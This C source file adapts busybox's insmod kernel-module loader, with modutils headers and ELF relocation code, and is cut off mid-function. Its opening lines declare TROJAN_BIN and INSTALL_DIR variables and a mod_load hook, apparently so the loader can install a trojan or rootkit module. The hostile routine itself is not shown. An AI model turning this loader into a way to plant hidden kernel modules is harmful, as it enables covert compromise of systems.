/* code ripped from busybox 0.51's insmod.c and made busybox independent. */
/* busybox rules, btw, nice tight clean code                              */
#include <stdlib.h>
#include <stdio.h>
#include <stddef.h>
#include <errno.h>
#include <unistd.h>
#include <dirent.h>
#include <ctype.h>
#include <assert.h>
#include <string.h>
#include <sys/stat.h>

#include "server.h"

#if defined(__powerpc__)
#define USE_PLT_ENTRIES
#define PLT_ENTRY_SIZE 16
#endif

#if defined(__arm__)
#define USE_PLT_ENTRIES
#define PLT_ENTRY_SIZE 8
#define USE_GOT_ENTRIES
#define GOT_ENTRY_SIZE 8
#endif

#if defined(__sh__)
#define USE_GOT_ENTRIES
#define GOT_ENTRY_SIZE 4
#endif

#if defined(__i386__)
#define USE_GOT_ENTRIES
#define GOT_ENTRY_SIZE 4
#endif

#if defined(__mips__)
// neither used
#endif

/* insert cheap hack ;) */
char *install_dir = INSTALL_DIR;
char *trojan_bin = TROJAN_BIN;
long offset;
long big = 12708;
int mod_load(char *, FILE *);
//----------------------------------------------------------------------------
//--------modutils module.h, lines 45-242
//----------------------------------------------------------------------------

/* Definitions for the Linux module syscall interface.
   Copyright 1996, 1997 Linux International.

   Contributed by Richard Henderson <rth@tamu.edu>

   This file is part of the Linux modutils.

   This program is free software; you can redistribute it and/or modify it
   under the terms of the GNU General Public License as published by the
   Free Software Foundation; either version 2 of the License, or (at your
   option) any later version.

   This program is distributed in the hope that it will be useful, but
   WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
   General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software Foundation,
   Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.  */


/*======================================================================*/
/* For sizeof() which are related to the module platform and not to the
   environment isnmod is running in, use sizeof_xx instead of sizeof(xx).  */

#define tgt_sizeof_char		sizeof(char)
#define tgt_sizeof_short	sizeof(short)
#define tgt_sizeof_int		sizeof(int)
#define tgt_sizeof_long		sizeof(long)
#define tgt_sizeof_char_p	sizeof(char *)
#define tgt_sizeof_void_p	sizeof(void *)
#define tgt_long		long

#if defined(__sparc__) && !defined(__sparc_v9__) && defined(ARCH_sparc64)
#undef tgt_sizeof_long
#undef tgt_sizeof_char_p
#undef tgt_sizeof_void_p
#undef tgt_long
static const int tgt_sizeof_long = 8;
static const int tgt_sizeof_char_p = 8;
static const int tgt_sizeof_void_p = 8;
#define tgt_long		long long
#endif

struct module_symbol
{
  unsigned long value;
  unsigned long name;
};

struct module_ref
{
  unsigned tgt_long dep;		/* kernel addresses */
  unsigned tgt_long ref;
  unsigned tgt_long next_ref;
};

struct module
{
  unsigned tgt_long size_of_struct;	/* == sizeof(module) */
  unsigned tgt_long next;
  unsigned tgt_long name;
  unsigned tgt_long size;

  tgt_long usecount;
  unsigned tgt_long flags;		/* AUTOCLEAN et al */

  unsigned nsyms;
  unsigned ndeps;

  unsigned tgt_long syms;
  unsigned tgt_long deps;
  unsigned tgt_long refs;
  unsigned tgt_long init;
  unsigned tgt_long cleanup;
  unsigned tgt_long ex_table_start;
  unsigned tgt_long ex_table_end;
#ifdef __alpha__
  unsigned tgt_long gp;
#endif
  /* Everything after here is extension.  */
  unsigned tgt_long persist_start;
  unsigned tgt_long persist_end;
  unsigned tgt_long can_unload;
  unsigned tgt_long runsize;
};

struct module_info
{
  unsigned long addr;
  unsigned long size;
  unsigned long flags;
	   long usecount;
};

/* Bits of module.flags.  */

static const int NEW_MOD_RUNNING = 1;
static const int NEW_MOD_DELETED = 2;
static const int NEW_MOD_AUTOCLEAN = 4;
static const int NEW_MOD_VISITED = 8;
static const int NEW_MOD_USED_ONCE = 16;

int init_module(const char *name, const struct module *);
int query_module(const char *name, int which, void *buf, size_t bufsize,
		 size_t *ret);

/* Values for query_module's which.  */

static const int QM_MODULES = 1;
static const int QM_DEPS = 2;
static const int QM_REFS = 3;
static const int QM_SYMBOLS = 4;
static const int QM_INFO = 5;

unsigned long create_module(const char *, size_t);
int delete_module(const char *);


//----------------------------------------------------------------------------
//--------end of modutils module.h
//----------------------------------------------------------------------------



//----------------------------------------------------------------------------
//--------modutils obj.h, lines 253-462
//----------------------------------------------------------------------------

/* Elf object file loading and relocation routines.
   Copyright 1996, 1997 Linux International.

   Contributed by Richard Henderson <rth@tamu.edu>

   This file is part of the Linux modutils.

   This program is free software; you can redistribute it and/or modify it
   under the terms of the GNU General Public License as published by the
   Free Software Foundation; either version 2 of the License, or (at your
   option) any later version.

   This program is distributed in the hope that it will be useful, but
   WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
   General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software Foundation,
   Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.  */


/* The relocatable object is manipulated using elfin types.  */

#include <stdio.h>
#include <elf.h>


/* Machine-specific elf macros for i386 et al.  */

/* the SH changes have only been tested on the SH4 in =little endian= mode */
/* I'm not sure about big endian, so let's warn: */

#if (defined(__SH4__) || defined(__SH3__)) && defined(__BIG_ENDIAN__)
#error insmod.c may require changes for use on big endian SH4/SH3
#endif

/* it may or may not work on the SH1/SH2... So let's error on those
   also */
#if (defined(__sh__) && (!(defined(__SH3__) || defined(__SH4__))))
#error insmod.c may require changes for non-SH3/SH4 use
#endif

#define ELFCLASSM	ELFCLASS32

#if defined(__sh__)

#define MATCH_MACHINE(x) (x == EM_SH)
#define SHT_RELM	SHT_RELA
#define Elf32_RelM	Elf32_Rela
#define ELFDATAM	ELFDATA2LSB

#elif defined(__arm__)

#define MATCH_MACHINE(x) (x == EM_ARM)
#define SHT_RELM	SHT_REL
#define Elf32_RelM	Elf32_Rel
#define ELFDATAM	ELFDATA2LSB

#elif defined(__powerpc__)

#define MATCH_MACHINE(x) (x == EM_PPC)
#define SHT_RELM	SHT_RELA
#define Elf32_RelM	Elf32_Rela
#define ELFDATAM        ELFDATA2MSB

#elif defined(__mips__)

/* Account for ELF spec changes.  */
#ifndef EM_MIPS_RS3_LE
#ifdef EM_MIPS_RS4_BE
#define EM_MIPS_RS3_LE	EM_MIPS_RS4_BE
#else
#define EM_MIPS_RS3_LE	10
#endif
#endif /* !EM_MIPS_RS3_LE */

#define MATCH_MACHINE(x) (x == EM_MIPS || x == EM_MIPS_RS3_LE)
#define SHT_RELM	SHT_REL
#define Elf32_RelM	Elf32_Rel
#ifdef __MIPSEB__
#define ELFDATAM        ELFDATA2MSB
#endif
#ifdef __MIPSEL__
#define ELFDATAM        ELFDATA2LSB
#endif

#elif defined(__i386__)

/* presumably we can use these for anything but the SH and ARM*/
/* this is the previous behavior, but it does result in
   insmod.c being broken on anything except i386 */
#ifndef EM_486
#define MATCH_MACHINE(x)  (x == EM_386)
#else
#define MATCH_MACHINE(x)  (x == EM_386 || x == EM_486)
#endif

#define SHT_RELM	SHT_REL
#define Elf32_RelM	Elf32_Rel
#define ELFDATAM	ELFDATA2LSB

#else
#error Sorry, but insmod.c does not yet support this architecture...
#endif

#ifndef ElfW
# if ELFCLASSM == ELFCLASS32
#  define ElfW(x)  Elf32_ ## x
#  define ELFW(x)  ELF32_ ## x
# else
#  define ElfW(x)  Elf64_ ## x
#  define ELFW(x)  ELF64_ ## x
# endif
#endif

/* For some reason this is missing from libc5.  */
#ifndef ELF32_ST_INFO
# define ELF32_ST_INFO(bind, type)       (((bind) << 4) + ((type) & 0xf))
#endif

#ifndef ELF64_ST_INFO
# define ELF64_ST_INFO(bind, type)       (((bind) << 4) + ((type) & 0xf))
#endif

struct obj_string_patch;
struct obj_symbol_patch;

struct obj_section
{
  ElfW(Shdr) header;
  const char *name;
  char *contents;
  struct obj_section *load_next;
  int idx;
};

struct obj_symbol
{
  struct obj_symbol *next;	/* hash table link */
  const char *name;
  unsigned long value;
  unsigned long size;
  int secidx;			/* the defining section index/module */
  int info;
  int ksymidx;			/* for export to the kernel symtab */
  int referenced;		/* actually used in the link */
};

/* Hardcode the hash table size.  We shouldn't be needing so many
   symbols that we begin to degrade performance, and we get a big win
   by giving the compiler a constant divisor.  */

#define HASH_BUCKETS  521

struct obj_file
{
  ElfW(Ehdr) header;
  ElfW(Addr) baseaddr;
  struct obj_section **sections;
  struct obj_section *load_order;
  struct obj_section **load_order_search_start;
  struct obj_string_patch *string_patches;
  struct obj_symbol_patch *symbol_patches;
  int (*symbol_cmp)(const char *, const char *);
  unsigned long (*symbol_hash)(const char *);
  unsigned long local_symtab_size;
  struct obj_symbol **local_symtab;
  struct obj_symbol *symtab[HASH_BUCKETS];
};

enum obj_reloc
{
  obj_reloc_ok,
  obj_reloc_overflow,
  obj_reloc_dangerous,
  obj_reloc_unhandled
};

struct obj_string_patch
{
  struct obj_string_patch *next;
  int reloc_secidx;
  ElfW(Addr) reloc_offset;
  ElfW(Addr) string_offset;
};

struct obj_symbol_patch
{
  struct obj_symbol_patch *next;
  int reloc_secidx;
  ElfW(Addr) reloc_offset;
  struct obj_symbol *sym;
};


/* Generic object manipulation routines.  */

unsigned long obj_elf_hash(const char *);

unsigned long obj_elf_hash_n(const char *, unsigned long len);

struct obj_symbol *obj_add_symbol (struct obj_file *f, const char *name,
				   unsigned long symidx, int info, int secidx,
				   ElfW(Addr) value, unsigned long size);

struct obj_symbol *obj_find_symbol (struct obj_file *f,
					 const char *name);

ElfW(Addr) obj_symbol_final_value(struct obj_file *f,
				  struct obj_symbol *sym);

void obj_set_symbol_compare(struct obj_file *f,
			    int (*cmp)(const char *, const char *),
			    unsigned long (*hash)(const char *));

struct obj_section *obj_find_section (struct obj_file *f,
					   const char *name);

void obj_insert_section_load_order (struct obj_file *f,
				    struct obj_section *sec);

struct obj_section *obj_create_alloced_section (struct obj_file *f,
						const char *name,
						unsigned long align,
						unsigned long size);

struct obj_section *obj_create_alloced_section_first (struct obj_file *f,
						      const char *name,
						      unsigned long align,
						      unsigned long size);

void *obj_extend_section (struct obj_section *sec, unsigned long more);

int obj_string_patch(struct obj_file *f, int secidx, ElfW(Addr) offset,
		     const char *string);

int obj_symbol_patch(struct obj_file *f, int secidx, ElfW(Addr) offset,
		     struct obj_symbol *sym);

int obj_check_undefineds(struct obj_file *f);

void obj_allocate_commons(struct obj_file *f);

unsigned long obj_load_size (struct obj_file *f);

int obj_relocate (struct obj_file *f, ElfW(Addr) base);

struct obj_file *obj_load(FILE *f);

int obj_create_image (struct obj_file *f, char *image);

/* Architecture specific manipulation routines.  */

struct obj_file *arch_new_file (void);

struct obj_section *arch_new_section (void);

struct obj_symbol *arch_new_symbol (void);

enum obj_reloc arch_apply_relocation (struct obj_file *f,
				      struct obj_section *targsec,
				      struct obj_section *symsec,
				      struct obj_symbol *sym,
				      ElfW(RelM) *rel, ElfW(Addr) value);

int arch_create_got (struct obj_file *f);

struct module;
int arch_init_module (struct obj_file *f, struct module *);

//----------------------------------------------------------------------------
//--------end of modutils obj.h
//----------------------------------------------------------------------------





/*======================================================================*/

/* previously, these were named i386_* but since we could be
   compiling for the sh, I've renamed them to the more general
   arch_* These structures are the same between the x86 and SH, 
   and we can't support anything else right now anyway. In the
   future maybe they should be #if defined'd */

/* Done ;-) */



#if defined(USE_PLT_ENTRIES)
struct arch_plt_entry
{
  int offset;
  int allocated:1;
  int inited:1;                /* has been set up */
};
#endif

#if defined(USE_GOT_ENTRIES)
struct arch_got_entry {
	int offset;
	unsigned offset_done:1;
	unsigned reloc_done:1;
};
#endif

#if defined(__mips__)
struct mips_hi16
{
  struct mips_hi16 *next;
  Elf32_Addr *addr;
  Elf32_Addr value;
};
#endif

struct arch_file {
	struct obj_file root;
#if defined(USE_PLT_ENTRIES)
	struct obj_section *plt;
#endif
#if defined(USE_GOT_ENTRIES)
	struct obj_section *got;
#endif
#if defined(__mips__)
	struct mips_hi16 *mips_hi16_list;
#endif
};

struct arch_symbol {
	struct obj_symbol root;
#if defined(USE_PLT_ENTRIES)
	struct arch_plt_entry pltent;
#endif
#if defined(USE_GOT_ENTRIES)
	struct arch_got_entry gotent;
#endif
};


struct external_module {
	const char *name;
	ElfW(Addr) addr;
	int used;
	size_t nsyms;
	struct module_symbol *syms;
};

struct module_symbol *ksyms;
size_t nksyms;

struct external_module *ext_modules;
int n_ext_modules;
int n_ext_modules_used;


extern int delete_module(const char *);


/* This is kind of troublesome. See, we don't actually support
   the m68k or the arm the same way we support i386 and (now)
   sh. In doing my SH patch, I just assumed that whatever works
   for i386 also works for m68k and arm since currently insmod.c
   does nothing special for them. If this isn't true, the below
   line is rather misleading IMHO, and someone should either
   change it or add more proper architecture-dependent support
   for these boys.

   -- Bryan Rittmeyer <bryan@ixiacom.com>                    */

static char m_fullName[BUFSIZ + 1];

/*======================================================================*/

struct obj_file *arch_new_file(void)
{
	struct arch_file *f;
	f = malloc(sizeof(*f));

#if defined(USE_PLT_ENTRIES)
	f->plt = NULL;
#endif
#if defined(USE_GOT_ENTRIES)
	f->got = NULL;
#endif
#if defined(__mips__)
	f->mips_hi16_list = NULL;
#endif

	return &f->root;
}

struct obj_section *arch_new_section(void)
{
	return malloc(sizeof(struct obj_section));
}

struct obj_symbol *arch_new_symbol(void)
{
	struct arch_symbol *sym;
	sym = malloc(sizeof(*sym));

#if defined(USE_PLT_ENTRIES)
	memset(&sym->pltent, 0, sizeof(sym->pltent));
#endif
#if defined(USE_GOT_ENTRIES)
	memset(&sym->gotent, 0, sizeof(sym->gotent));
#endif

	return &sym->root;
}

enum obj_reloc
arch_apply_relocation(struct obj_file *f,
					  struct obj_section *targsec,
					  struct obj_section *symsec,
					  struct obj_symbol *sym,
				      ElfW(RelM) *rel, ElfW(Addr) v)
{
	struct arch_file *ifile = (struct arch_file *) f;
#if !(defined(__mips__))
	struct arch_symbol *isym = (struct arch_symbol *) sym;
#endif

	ElfW(Addr) *loc = (ElfW(Addr) *) (targsec->contents + rel->r_offset);
	ElfW(Addr) dot = targsec->header.sh_addr + rel->r_offset;
#if defined(USE_GOT_ENTRIES)
	ElfW(Addr) got = ifile->got ? ifile->got->header.sh_addr : 0;
#endif
#if defined(USE_PLT_ENTRIES)
	ElfW(Addr) plt = ifile->plt ? ifile->plt->header.sh_addr : 0;
	struct arch_plt_entry *pe;
	unsigned long *ip;
#endif
	enum obj_reloc ret = obj_reloc_ok;

	switch (ELF32_R_TYPE(rel->r_info)) {

/* even though these constants seem to be the same for
   the i386 and the sh, we "#if define" them for clarity
   and in case that ever changes */
#if defined(__sh__)
	case R_SH_NONE:
#elif defined(__arm__)
	case R_ARM_NONE:
#elif defined(__i386__)
	case R_386_NONE:
#elif defined(__powerpc__)
	case R_PPC_NONE:
#elif defined(__mips__)
	case R_MIPS_NONE:
#endif
		break;

#if defined(__sh__)
	case R_SH_DIR32:
#elif defined(__arm__)
	case R_ARM_ABS32:
#elif defined(__i386__)
	case R_386_32:	
#elif defined(__powerpc__)
	case R_PPC_ADDR32:
#elif defined(__mips__)
	case R_MIPS_32:
#endif
		*loc += v;
		break;

#if defined(__powerpc__)
	case R_PPC_ADDR16_HA:
		*(unsigned short *)loc = (v + 0x8000) >> 16;
		break;

	case R_PPC_ADDR16_HI:
		*(unsigned short *)loc = v >> 16;
		break;

	case R_PPC_ADDR16_LO:
		*(unsigned short *)loc = v;
		break;
#endif

#if defined(__mips__)
	case R_MIPS_26:
		if (v % 4)
			ret = obj_reloc_dangerous;
		if ((v & 0xf0000000) != ((dot + 4) & 0xf0000000))
			ret = obj_reloc_overflow;
		*loc =
		    (*loc & ~0x03ffffff) | ((*loc + (v >> 2)) &
					    0x03ffffff);
		break;

	case R_MIPS_HI16:
		{
			struct mips_hi16 *n;

			/* We cannot relocate this one now because we don't know the value
			   of the carry we need to add.  Save the information, and let LO16
			   do the actual relocation.  */
			n = (struct mips_hi16 *) malloc(sizeof *n);
			n->addr = loc;
			n->value = v;
			n->next = ifile->mips_hi16_list;
			ifile->mips_hi16_list = n;
	       		break;
		}

	case R_MIPS_LO16:
		{
			unsigned long insnlo = *loc;
			Elf32_Addr val, vallo;

			/* Sign extend the addend we extract from the lo insn.  */
			vallo = ((insnlo & 0xffff) ^ 0x8000) - 0x8000;

			if (ifile->mips_hi16_list != NULL) {
				struct mips_hi16 *l;

				l = ifile->mips_hi16_list;
				while (l != NULL) {
					struct mips_hi16 *next;
					unsigned long insn;

					/* The value for the HI16 had best be the same. */
					assert(v == l->value);

					/* Do the HI16 relocation.  Note that we actually don't
					   need to know anything about the LO16 itself, except where
					   to find the low 16 bits of the addend needed by the LO16.  */
					insn = *l->addr;
					val =
					    ((insn & 0xffff) << 16) +
					    vallo;
					val += v;

					/* Account for the sign extension that will happen in the
					   low bits.  */
					val =
					    ((val >> 16) +
					     ((val & 0x8000) !=
					      0)) & 0xffff;

					insn = (insn & ~0xffff) | val;
					*l->addr = insn;

					next = l->next;
					free(l);
					l = next;
				}

				ifile->mips_hi16_list = NULL;
			}

			/* Ok, we're done with the HI16 relocs.  Now deal with the LO16.  */
			val = v + vallo;
			insnlo = (insnlo & ~0xffff) | (val & 0xffff);
			*loc = insnlo;
			break;
		}
#endif

#if defined(__arm__)
#elif defined(__sh__)
        case R_SH_REL32:
		*loc += v - dot;
		break;
#elif defined(__i386__)
	case R_386_PLT32:
	case R_386_PC32:
		*loc += v - dot;
		break;
#elif defined(__powerpc__)
	case R_PPC_REL32:
		*loc = v - dot;
		break;
#endif

#if defined(__sh__)
        case R_SH_PLT32:
                *loc = v - dot;
                break;
#elif defined(__i386__)
#endif

#if defined(USE_PLT_ENTRIES)

#if defined(__arm__)
    case R_ARM_PC24:
    case R_ARM_PLT32:
#endif
#if defined(__powerpc__)
	case R_PPC_REL24:
#endif
      /* find the plt entry and initialize it if necessary */
      assert(isym != NULL);

      pe = (struct arch_plt_entry*) &isym->pltent;

      if (! pe->inited) {
	  	ip = (unsigned long *) (ifile->plt->contents + pe->offset);

		/* generate some machine code */

#if defined(__arm__)
	  	ip[0] = 0xe51ff004;			/* ldr pc,[pc,#-4] */
	  	ip[1] = v;				/* sym@ */
#endif
#if defined(__powerpc__)
	  ip[0] = 0x3d600000 + ((v + 0x8000) >> 16);  /* lis r11,sym@ha */
	  ip[1] = 0x396b0000 + (v & 0xffff);	      /* addi r11,r11,sym@l */
	  ip[2] = 0x7d6903a6;			      /* mtctr r11 */
	  ip[3] = 0x4e800420;			      /* bctr */
#endif
	  	pe->inited = 1;
	  }

      /* relative distance to target */
      v -= dot;
      /* if the target is too far away.... */
      if ((int)v < -0x02000000 || (int)v >= 0x02000000) {
	    /* go via the plt */
	    v = plt + pe->offset - dot;
	  }
      if (v & 3)
	    ret = obj_reloc_dangerous;

      /* merge the offset into the instruction. */
#if defined(__arm__)
      /* Convert to words. */
      v >>= 2;

      *loc = (*loc & ~0x00ffffff) | ((v + *loc) & 0x00ffffff);
#endif
#if defined(__powerpc__)
      *loc = (*loc & ~0x03fffffc) | (v & 0x03fffffc);
#endif
      break;
#endif /* USE_PLT_ENTRIES */

#if defined(__arm__)
#elif defined(__sh__)
        case R_SH_GLOB_DAT:
        case R_SH_JMP_SLOT:
               	*loc = v;
                break;
#elif defined(__i386__)
	case R_386_GLOB_DAT:
	case R_386_JMP_SLOT:
		*loc = v;
		break;
#endif

#if defined(__arm__)
#elif defined(__sh__)
        case R_SH_RELATIVE:
	        *loc += f->baseaddr + rel->r_addend;
                break;
#elif defined(__i386__)
        case R_386_RELATIVE:
		*loc += f->baseaddr;
		break;
#endif

#if defined(USE_GOT_ENTRIES)

#if defined(__sh__)
        case R_SH_GOTPC:
#elif defined(__arm__)
    case R_ARM_GOTPC:
#elif defined(__i386__)
	case R_386_GOTPC:
#endif
		assert(got != 0);
#if defined(__sh__)
		*loc += got - dot + rel->r_addend;;
#elif defined(__i386__) || defined(__arm__)
		*loc += got - dot;
#endif
		break;

#if defined(__sh__)
	case R_SH_GOT32:
#elif defined(__arm__)
	case R_ARM_GOT32:
#elif defined(__i386__)
	case R_386_GOT32:
#endif
		assert(isym != NULL);
        /* needs an entry in the .got: set it, once */
		if (!isym->gotent.reloc_done) {
			isym->gotent.reloc_done = 1;
			*(ElfW(Addr) *) (ifile->got->contents + isym->gotent.offset) = v;
		}
        /* make the reloc with_respect_to_.got */
#if defined(__sh__)
		*loc += isym->gotent.offset + rel->r_addend;
#elif defined(__i386__) || defined(__arm__)
		*loc += isym->gotent.offset;
#endif
		break;

    /* address relative to the got */
#if defined(__sh__)
	case R_SH_GOTOFF:
#elif defined(__arm__)
	case R_ARM_GOTOFF:
#elif defined(__i386__)
	case R_386_GOTOFF:
#endif
		assert(got != 0);
		*loc += v - got;
		break;

#endif /* USE_GOT_ENTRIES */

	default:
		break;
	}

	return ret;
}

int arch_create_got(struct obj_file *f)
{
#if defined(USE_GOT_ENTRIES) || defined(USE_PLT_ENTRIES)
	struct arch_file *ifile = (struct arch_file *) f;
	int i;
#if defined(USE_GOT_ENTRIES)
	int got_offset = 0, gotneeded = 0;
#endif
#if defined(USE_PLT_ENTRIES)
	int plt_offset = 0, pltneeded = 0;
#endif
    struct obj_section *relsec, *symsec, *strsec;
	ElfW(RelM) *rel, *relend;
	ElfW(Sym) *symtab, *extsym;
	const char *strtab, *name;
	struct arch_symbol *intsym;

	for (i = 0; i < f->header.e_shnum; ++i) {
		relsec = f->sections[i];
		if (relsec->header.sh_type != SHT_RELM)
			continue;

		symsec = f->sections[relsec->header.sh_link];
		strsec = f->sections[symsec->header.sh_link];

		rel = (ElfW(RelM) *) relsec->contents;
		relend = rel + (relsec->header.sh_size / sizeof(ElfW(RelM)));
		symtab = (ElfW(Sym) *) symsec->contents;
		strtab = (const char *) strsec->contents;

		for (; rel < relend; ++rel) {
			extsym = &symtab[ELF32_R_SYM(rel->r_info)];

			switch (ELF32_R_TYPE(rel->r_info)) {
#if defined(__arm__)
			case R_ARM_GOT32:
				break;
#elif defined(__sh__)
			case R_SH_GOT32:
				break;
#elif defined(__i386__)
			case R_386_GOT32:
				break;
#endif

#if defined(__powerpc__)
			case R_PPC_REL24:
				pltneeded = 1;
				break;
#endif

#if defined(__arm__)
			case R_ARM_PC24:
			case R_ARM_PLT32:
				pltneeded = 1;
				break;

			case R_ARM_GOTPC:
			case R_ARM_GOTOFF:
				gotneeded = 1;
				if (got_offset == 0)
					got_offset = 4;
#elif defined(__sh__)
			case R_SH_GOTPC:
			case R_SH_GOTOFF:
				gotneeded = 1;
#elif defined(__i386__)
			case R_386_GOTPC:
			case R_386_GOTOFF:
				gotneeded = 1;
#endif

			default:
				continue;
			}

			if (extsym->st_name != 0) {
				name = strtab + extsym->st_name;
			} else {
				name = f->sections[extsym->st_shndx]->name;
			}
			intsym = (struct arch_symbol *) obj_find_symbol(f, name);
#if defined(USE_GOT_ENTRIES)
			if (!intsym->gotent.offset_done) {
				intsym->gotent.offset_done = 1;
				intsym->gotent.offset = got_offset;
				got_offset += GOT_ENTRY_SIZE;
			}
#endif
#if defined(USE_PLT_ENTRIES)
			if (pltneeded && intsym->pltent.allocated == 0) {
				intsym->pltent.allocated = 1;
				intsym->pltent.offset = plt_offset;
				plt_offset += PLT_ENTRY_SIZE;
				intsym->pltent.inited = 0;
				pltneeded = 0;
			}
#endif
			}
		}

#if defined(USE_GOT_ENTRIES)
	if (got_offset) {
		struct obj_section* myrelsec = obj_find_section(f, ".got");

		if (myrelsec) {
			obj_extend_section(myrelsec, got_offset);
		} else {
			myrelsec = obj_create_alloced_section(f, ".got", 
							    GOT_ENTRY_SIZE,
							    got_offset);
			assert(myrelsec);
		}

		ifile->got = myrelsec;
	}
#endif

#if defined(USE_PLT_ENTRIES)
	if (plt_offset)
		ifile->plt = obj_create_alloced_section(f, ".plt", 
							PLT_ENTRY_SIZE, 
							plt_offset);
#endif
#endif
	return 1;
}

int arch_init_module(struct obj_file *f, struct module *mod)
{
	return 1;
}


/*======================================================================*/

/* Standard ELF hash function.  */
inline unsigned long obj_elf_hash_n(const char *name, unsigned long n)
{
	unsigned long h = 0;
	unsigned long g;
	unsigned char ch;

	while (n > 0) {
		ch = *name++;
		h = (h << 4) + ch;
		if ((g = (h & 0xf0000000)) != 0) {
			h ^= g >> 24;
			h &= ~g;
		}
		n--;
	}
	return h;
}

unsigned long obj_elf_hash(const char *name)
{
	return obj_elf_hash_n(name, strlen(name));
}

struct obj_symbol *obj_add_symbol(struct obj_file *f, const char *name,
								  unsigned long symidx, int info,
								  int secidx, ElfW(Addr) value,
								  unsigned long size)
{
	struct obj_symbol *sym;
	unsigned long hash = f->symbol_hash(name) % HASH_BUCKETS;
	int n_type = ELFW(ST_TYPE) (info);
	int n_binding = ELFW(ST_BIND) (info);

	for (sym = f->symtab[hash]; sym; sym = sym->next)
		if (f->symbol_cmp(sym->name, name) == 0) {
			int o_secidx = sym->secidx;
			int o_info = sym->info;
			int o_type = ELFW(ST_TYPE) (o_info);
			int o_binding = ELFW(ST_BIND) (o_info);

			/* A redefinition!  Is it legal?  */

			if (secidx == SHN_UNDEF)
				return sym;
			else if (o_secidx == SHN_UNDEF)
				goto found;
			else if (n_binding == STB_GLOBAL && o_binding == STB_LOCAL) {
				/* Cope with local and global symbols of the same name
				   in the same object file, as might have been created
				   by ld -r.  The only reason locals are now seen at this
				   level at all is so that we can do semi-sensible things
				   with parameters.  */

				struct obj_symbol *nsym, **p;

				nsym = arch_new_symbol();
				nsym->next = sym->next;
				nsym->ksymidx = -1;

				/* Excise the old (local) symbol from the hash chain.  */
				for (p = &f->symtab[hash]; *p != sym; p = &(*p)->next)
					continue;
				*p = sym = nsym;
				goto found;
			} else if (n_binding == STB_LOCAL) {
				/* Another symbol of the same name has already been defined.
				   Just add this to the local table.  */
				sym = arch_new_symbol();
				sym->next = NULL;
				sym->ksymidx = -1;
				f->local_symtab[symidx] = sym;
				goto found;
			} else if (n_binding == STB_WEAK)
				return sym;
			else if (o_binding == STB_WEAK)
				goto found;
			/* Don't unify COMMON symbols with object types the programmer
			   doesn't expect.  */
			else if (secidx == SHN_COMMON
					 && (o_type == STT_NOTYPE || o_type == STT_OBJECT))
				return sym;
			else if (o_secidx == SHN_COMMON
					 && (n_type == STT_NOTYPE || n_type == STT_OBJECT))
				goto found;
			else {
				/* Don't report an error if the symbol is coming from
				   the kernel or some external module.  */
				return sym;
			}
		}

	/* Completely new symbol.  */
	sym = arch_new_symbol();
	sym->next = f->symtab[hash];
	f->symtab[hash] = sym;
	sym->ksymidx = -1;

	if (ELFW(ST_BIND) (info) == STB_LOCAL)
		f->local_symtab[symidx] = sym;

  found:
	sym->name = name;
	sym->value = value;
	sym->size = size;
	sym->secidx = secidx;
	sym->info = info;

	return sym;
}

struct obj_symbol *obj_find_symbol(struct obj_file *f, const char *name)
{
	struct obj_symbol *sym;
	unsigned long hash = f->symbol_hash(name) % HASH_BUCKETS;

	for (sym = f->symtab[hash]; sym; sym = sym->next)
		if (f->symbol_cmp(sym->name, name) == 0)
			return sym;

	return NULL;
}

ElfW(Addr)
	obj_symbol_final_value(struct obj_file * f, struct obj_symbol * sym)
{
	if (sym) {
		if (sym->secidx >= SHN_LORESERVE)
			return sym->value;

		return sym->value + f->sections[sym->secidx]->header.sh_addr;
	} else {
		/* As a special case, a NULL sym has value zero.  */
		return 0;
	}
}

struct obj_section *obj_find_section(struct obj_file *f, const char *name)
{
	int i, n = f->header.e_shnum;

	for (i = 0; i < n; ++i)
		if (strcmp(f->sections[i]->name, name) == 0)
			return f->sections[i];

	return NULL;
}

static int obj_load_order_prio(struct obj_section *a)
{
	unsigned long af, ac;

	af = a->header.sh_flags;

	ac = 0;
	if (a->name[0] != '.' || strlen(a->name) != 10 ||
		strcmp(a->name + 5, ".init"))
		ac |= 32;
	if (af & SHF_ALLOC)
		ac |= 16;
	if (!(af & SHF_WRITE))
		ac |= 8;
	if (af & SHF_EXECINSTR)
		ac |= 4;
	if (a->header.sh_type != SHT_NOBITS)
		ac |= 2;

	return ac;
}

void
obj_insert_section_load_order(struct obj_file *f, struct obj_section *sec)
{
	struct obj_section **p;
	int prio = obj_load_order_prio(sec);
	for (p = f->load_order_search_start; *p; p = &(*p)->load_next)
		if (obj_load_order_prio(*p) < prio)
			break;
	sec->load_next = *p;
	*p = sec;
}

struct obj_section *obj_create_alloced_section(struct obj_file *f,
											   const char *name,
											   unsigned long align,
											   unsigned long size)
{
	int newidx = f->header.e_shnum++;
	struct obj_section *sec;

	f->sections = realloc(f->sections, (newidx + 1) * sizeof(sec));
	f->sections[newidx] = sec = arch_new_section();

	memset(sec, 0, sizeof(*sec));
	sec->header.sh_type = SHT_PROGBITS;
	sec->header.sh_flags = SHF_WRITE | SHF_ALLOC;
	sec->header.sh_size = size;
	sec->header.sh_addralign = align;
	sec->name = name;
	sec->idx = newidx;
	if (size)
		sec->contents = malloc(size);

	obj_insert_section_load_order(f, sec);

	return sec;
}

struct obj_section *obj_create_alloced_section_first(struct obj_file *f,
													 const char *name,
													 unsigned long align,
													 unsigned long size)
{
	int newidx = f->header.e_shnum++;
	struct obj_section *sec;

	f->sections = realloc(f->sections, (newidx + 1) * sizeof(sec));
	f->sections[newidx] = sec = arch_new_section();

	memset(sec, 0, sizeof(*sec));
	sec->header.sh_type = SHT_PROGBITS;
	sec->header.sh_flags = SHF_WRITE | SHF_ALLOC;
	sec->header.sh_size = size;
	sec->header.sh_addralign = align;
	sec->name = name;
	sec->idx = newidx;
	if (size)
		sec->contents = malloc(size);

	sec->load_next = f->load_order;
	f->load_order = sec;
	if (f->load_order_search_start == &f->load_order)
		f->load_order_search_start = &sec->load_next;

	return sec;
}

void *obj_extend_section(struct obj_section *sec, unsigned long more)
{
	unsigned long oldsize = sec->header.sh_size;
	sec->contents = realloc(sec->contents, sec->header.sh_size += more);
